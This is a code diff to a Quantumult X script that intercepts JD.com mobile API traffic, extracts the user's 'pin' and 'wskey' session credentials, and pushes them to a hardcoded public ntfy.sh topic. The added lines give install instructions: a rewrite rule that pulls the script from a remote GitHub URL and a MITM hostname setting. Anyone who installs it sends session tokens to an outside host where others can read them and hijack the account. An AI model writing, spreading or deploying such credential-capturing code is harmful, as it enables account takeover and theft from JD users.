@@ -1,6 +1,11 @@
 /**************************
  * 京东 wskey 抓取 (Quantumult X)
  * 抓 api.m.jd.com 请求里的 pin + wskey，推到 ntfy
+ *
+ * 重写规则 (在 [rewrite_local] 添加):
+ * ^https?:\/\/api\.m\.jd\.com url script-request-header https://raw.githubusercontent.com/xiaotaiye88/Test/main/qx_jd_wskey.js
+ *
+ * MITM 主机名: api.m.jd.com
  **************************/
 
 const NTFY_URL = "https://ntfy.sh/HzjHy2codes";
@@ -15,7 +20,6 @@ try {
     const pin = pinM ? pinM[1] : "unknown";
     const payload = `JDWSKEY pin=${pin};wskey=${wskey};`;
 
-    // 推到 ntfy（去重：同一个 pin+wskey 只推一次）
     const key = `qxjd_${pin}_${wskey.substring(0, 16)}`;
     if (typeof $persistentStore !== "undefined") {
       const last = $persistentStore.read(key);
